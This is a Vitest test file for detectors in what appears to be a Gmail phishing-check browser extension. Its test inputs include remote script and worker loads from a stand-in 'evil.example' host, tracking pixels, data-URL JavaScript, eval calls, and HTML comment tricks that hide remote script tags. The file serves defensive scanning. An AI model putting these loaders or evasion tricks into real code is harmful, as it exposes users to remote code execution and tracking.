// Self-checks for the detectors in helpers.ts, so the structure tests cannot pass vacuously.
import { describe, expect, it } from 'vitest';
import {
  findApiKeys,
  findCssRemoteUrls,
  findDeniedRemoteHosts,
  findHtmlProblems,
  findRemoteCodeInFile,
  findRemoteCodeLoads,
  htmlResources,
  isNonLocalUrl,
  normalizeInside,
  parseEnv,
} from './helpers';

describe('findRemoteCodeLoads', () => {
  it.each([
    // static imports / re-exports from URLs
    `import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js';`,
    `import{a as b}from"https://cdn.example/m.js"`,
    `export * from "https://cdn.example/m.js";`,
    `export { x } from '//cdn.example/m.js';`,
    `import 'https://cdn.example/side-effect.js';`,
    `import 'data:text/javascript,alert(1)';`,
    // dynamic import()
    `import("https://cdn.example/mod.js")`,
    `import(/* @vite-ignore */ 'http://cdn.example/mod.js')`,
    'import(`//cdn.example/mod.js`)',
    'import(`${base}/x.js`)',
    'import(`https://cdn.example/${lang}.js`)',
    'import(`${"./"}x.js`)',
    `import(url)`,
    `import(name + '.js')`,
    `import(chrome.runtime.getURL(file))`,
    `import(chrome.runtime.getURL('https://evil.example/x.js'))`,
    // importScripts / workers
    `importScripts("https://evil.example/x.js")`,
    `self.importScripts('a.js', 'https://evil.example/x.js')`,
    `importScripts(url)`,
    `new Worker('https://evil.example/w.js')`,
    `new SharedWorker(workerUrl)`,
    `new Worker(new URL('https://evil.example/w.js', import.meta.url))`,
    `new Worker(new URL('./w.js', 'https://evil.example/'))`,
    // string evaluation
    `eval(code)`,
    `window.eval("1")`,
    `new Function('return 1')`,
    `Function('return this')()`,
    // script injection
    `const s = document.createElement('script'); s.src = base + '/model.js';`,
    'document.createElement(`SCRIPT`)',
    `document.createElementNS('http://www.w3.org/2000/svg', 'script')`,
    // remote src
    `img.src = 'https://tracker.example/pixel.gif'`,
    'el.src = `https://${host}/x.js`',
    `el['src'] = 'https://cdn.example/x.js'`,
    `el.setAttribute('src', 'https://cdn.example/x.js')`,
    `el.setAttribute('SRC', '//cdn.example/x.js')`,
    // TypeScript syntax is parsed as well
    `const url: string = 'https://x'; await import(url as string);`,
  ])('flags %s', (code) => {
    expect(findRemoteCodeLoads(code, 'input.ts')).not.toEqual([]);
  });

  it.each([
    // plain string data (sample phishing mails, prompts, API endpoints) is never code loading
    `const SAMPLE = '<script src="https://evil.example/x.js"></script>';`,
    `el.innerHTML = "<script src=\\"https://cdn.example/x.js\\"></script>"`,
    `const prompt = \`Is this phishing? import("https://evil.example") eval(x)\`;`,
    `const url = "https://firebasevertexai.googleapis.com/v1beta";`,
    `fetch("https://generativelanguage.googleapis.com/v1beta/models")`,
    `const x = Array.from("https://example.com");`,
    // local / bundled modules (also how Vite emits lazy chunks and workers)
    `import { a } from './assets/chunk-abc.js';`,
    `import { initializeApp } from 'firebase/app';`,
    `import './assets/background.ts-BJ4N6UWp.js';`,
    `import("./chunk.js")`,
    'import(`./lazy-DT2320O_.js`)',
    // relative path patterns: Vite bundles every match, `./`/`../` never leaves the package
    'import(`./locales/${lang}.ts`)',
    'import(`../prompts/${name}.js`)',
    `import('./locales/' + lang + '.ts')`,
    `new URL("./worker.js", import.meta.url)`,
    `new Worker(new URL('./worker.js', import.meta.url), { type: 'module' })`,
    `new Worker('' + new URL('assets/worker-abc.js', import.meta.url).href)`,
    'new Worker(new URL(`/assets/worker-D6yRw1j_.js`,``+import.meta.url),{type:`module`})',
    `new Worker('/assets/worker.js')`,
    `importScripts('local.js')`,
    // crxjs content-script loader
    `await import(/* @vite-ignore */ chrome.runtime.getURL("assets/src-content-gmail.ts-DJvD6Unw.js"))`,
    // UI code that is not code loading
    `a.href = item.link`,
    `img.src = previewUrl`,
    `location.href = 'https://mail.google.com/'`,
    `window.location.href = 'https://mail.google.com/'`,
    // href navigates (links, help pages); it does not load code
    `a.href = 'https://support.google.com/mail/answer/8253'`,
    `link.href = '//cdn.example/style.css'`,
    `el.setAttribute('HREF', 'http://cdn.example/x.css')`,
    `document.createElement('link')`,
    `el.setAttribute('title', 'https://example.com')`,
    `obj.eval('x')`,
    // TypeScript-only syntax
    `enum Verdict { Safe, Phishing } const v: Verdict = Verdict.Safe; export type { Verdict };`,
  ])('does not flag %s', (code) => {
    expect(findRemoteCodeLoads(code, 'input.ts')).toEqual([]);
  });

  it('reports unparseable files instead of silently passing', () => {
    expect(findRemoteCodeLoads('const = ;', 'broken.js')[0]).toMatch(/could not parse/);
  });

  it('reports hits in source order', () => {
    const code = `eval(a);\nimport('https://x/b.js');\nnew Function('c');`;
    expect(findRemoteCodeLoads(code).map((hit) => hit.split(':')[0])).toEqual([
      'eval() evaluates code from strings',
      'dynamic import() of a non-local source',
      'Function() evaluates code from strings',
    ]);
  });

  it('handles very large arrays (no spread into push)', () => {
    const code = `export const TABLE = [${'0,'.repeat(200_000)}];`;
    expect(findRemoteCodeLoads(code)).toEqual([]);
  });

  it('includes the offending code in the message', () => {
    expect(findRemoteCodeLoads(`import('https://cdn.example/a.js')`)).toEqual([
      `dynamic import() of a non-local source: import('https://cdn.example/a.js')`,
    ]);
  });
});

describe('findDeniedRemoteHosts', () => {
  it.each([
    `gapiScript:"https://apis.google.com/js/api.js"`,
    `recaptchaV2Script:"https://www.google.com/recaptcha/api.js"`,
    `"https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js"`,
  ])('flags %s', (code) => {
    expect(findDeniedRemoteHosts(code)).not.toEqual([]);
  });

  it('does not flag API endpoints', () => {
    expect(findDeniedRemoteHosts(`"https://firebasevertexai.googleapis.com/v1beta"`)).toEqual([]);
  });
});

describe('findCssRemoteUrls', () => {
  it.each([
    `@import url("https://fonts.googleapis.com/css2?family=Inter");`,
    `@import 'https://cdn.example/a.css';`,
    `@import url(//cdn.example/a.css);`,
    `body { background: url(https://tracker.example/p.gif) }`,
    `body { background: url( 'http://x.example/a.png' ) }`,
  ])('flags %s', (css) => {
    expect(findCssRemoteUrls(css)).not.toEqual([]);
  });

  it.each([
    `@import './base.css';`,
    `@import url(theme.css);`,
    `body { background: url(/assets/bg.png) }`,
    `i { background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>") }`,
    `/* url(https://commented.example/x.png) */ p { color: red }`,
  ])('does not flag %s', (css) => {
    expect(findCssRemoteUrls(css)).toEqual([]);
  });

  it('reports @import url(…) once', () => {
    expect(findCssRemoteUrls(`@import url("https://fonts.example/a.css");`)).toHaveLength(1);
  });
});

describe('htmlResources / findHtmlProblems', () => {
  it('extracts resource URLs, quote-aware and without data-src', () => {
    const html = [
      `<script src="/a.js"></script>`,
      `<link rel="stylesheet" href='b.css'>`,
      `<img alt="a > b" src="c.png" data-src="https://lazy.example/x.png">`,
      `<script>1</script>`,
    ].join('');
    expect(htmlResources(html).map((r) => r.url)).toEqual(['/a.js', 'b.css', 'c.png']);
  });

  it.each([
    `<script src="https://cdn.example/x.js"></script>`,
    `<script type="module" src='//cdn.example/x.js'></script>`,
    `<script src="data:text/javascript,alert(1)"></script>`,
    `<link rel="stylesheet" href="https://fonts.googleapis.com/css">`,
    `<link rel="preconnect" href="https://tracker.example">`,
    `<base href="https://cdn.example/">`,
    `<iframe src="https://evil.example"></iframe>`,
    `<object data="https://evil.example/x.swf"></object>`,
    `<embed src="//evil.example/x">`,
    `<img src="https://tracker.example/pixel.gif">`,
    `<img srcset="a.png 1x, https://tracker.example/b.png 2x">`,
    `<style>@import url(https://fonts.example/a.css);</style>`,
    // inline scripts never run on MV3 extension pages, whatever they contain
    `<script>import('https://cdn.example/x.js')</script>`,
    `<script>console.log('hi')</script>`,
    `<script type="module">import './main.js';</script>`,
    `<script type="text/javascript">1</script>`,
    `<script type="importmap">{"imports":{"x":"https://cdn.example/x.js"}}</script>`,
    `<script>const sample = '<script src="https://evil.example/x.js">';</script>`,
    // HTML comments are scanned too; regex stripping cannot match how browsers end comments
    `<!-- <script src="https://commented.example/x.js"></script> -->`,
    `<!--> <script src="https://evil.example/x.js"></script> -->`,
    `<!---> <script src="https://evil.example/x.js"></script> -->`,
    `<! <!-- > <script src="https://evil.example/x.js"></script> -->`,
    // an unclosed <script> in a comment swallows the next script; still reported (inline rule)
    `<!-- <script> --><script src="https://evil.example/x.js"></script>`,
  ])('flags %s', (html) => {
    expect(findHtmlProblems(html)).not.toEqual([]);
  });

  it.each([
    `<script type="module" src="./main.ts"></script>`,
    `<script type="module" crossorigin src="/assets/index.js"></script>`,
    `<img src="data:image/png;base64,AAAA">`,
    `<div data-src="https://example.com/x.js"></div>`,
    `<a href="https://support.google.com/mail">Help</a>`,
    `<p title="<script src='https://evil.example/x.js'>">sample</p>`,
    `<script type="application/json">{"url":"https://example.com"}</script>`,
    `<script type="module" src="./main.ts">  </script>`,
  ])('does not flag %s', (html) => {
    expect(findHtmlProblems(html)).toEqual([]);
  });
});

describe('findRemoteCodeInFile', () => {
  it('passes a source file that contains sample phishing HTML as data', () => {
    const source = [
      `export const SAMPLES: readonly string[] = [`,
      `  '<script src="https://evil.example/x.js"></script>',`,
      `  '<img src="https://evil.example/track.gif"><a href="//evil.example/login">Verify</a>',`,
      `  "@import url(https://evil.example/a.css);",`,
      `];`,
    ].join('\n');
    expect(findRemoteCodeInFile('src/samples.ts', source)).toEqual([]);
  });

  it('dispatches by file type', () => {
    expect(findRemoteCodeInFile('a.js', `import('https://x/a.js')`)).not.toEqual([]);
    expect(findRemoteCodeInFile('a.html', `<script src="https://x/a.js"></script>`)).not.toEqual(
      [],
    );
    expect(findRemoteCodeInFile('a.css', `@import 'https://x/a.css';`)).not.toEqual([]);
    expect(findRemoteCodeInFile('a.txt', `import('https://x/a.js')`)).toEqual([]);
  });
});

describe('isNonLocalUrl / normalizeInside', () => {
  it.each(['https://x/a.js', 'http://x/a.js', '//x/a.js', 'data:text/js,1', 'chrome://x'])(
    '%s is non-local',
    (url) => {
      expect(isNonLocalUrl(url)).toBe(true);
    },
  );

  it.each(['/assets/a.js', './a.js', 'a.js', '../a.css', 'firebase/app'])('%s is local', (url) => {
    expect(isNonLocalUrl(url)).toBe(false);
  });

  it('normalizes paths and rejects paths escaping the base directory', () => {
    expect(normalizeInside('/assets/./a.js')).toBe('assets/a.js');
    expect(normalizeInside('src\\sidepanel\\index.html')).toBe('src/sidepanel/index.html');
    expect(normalizeInside('../secret.txt')).toBeUndefined();
    expect(normalizeInside('assets/../../x.js')).toBeUndefined();
  });
});

describe('findApiKeys', () => {
  // Built at runtime so this file itself never contains a key-shaped string.
  const fakeKey = `AIza${'A1b2_c3-D4'.repeat(3)}xyzab`;

  it('finds Google API keys and masks them', () => {
    const hits = findApiKeys(`a\nVITE_FIREBASE_API_KEY=${fakeKey}\n`);
    expect(hits).toEqual(['line 2: AIzaA1…']);
  });

  it('ignores the variable name alone', () => {
    expect(findApiKeys('VITE_FIREBASE_API_KEY=')).toEqual([]);
  });
});

describe('parseEnv', () => {
  it('reads keys and values, skipping comments and empty lines (CRLF-safe)', () => {
    const text = '# comment\r\nA=1\r\n\r\nB = two words # note\r\nC="quoted # kept"\r\nD=\r\nE\r\n';
    expect(parseEnv(text)).toEqual([
      { key: 'A', value: '1' },
      { key: 'B', value: 'two words' },
      { key: 'C', value: 'quoted # kept' },
      { key: 'D', value: '' },
      { key: 'E', value: undefined },
    ]);
  });
});
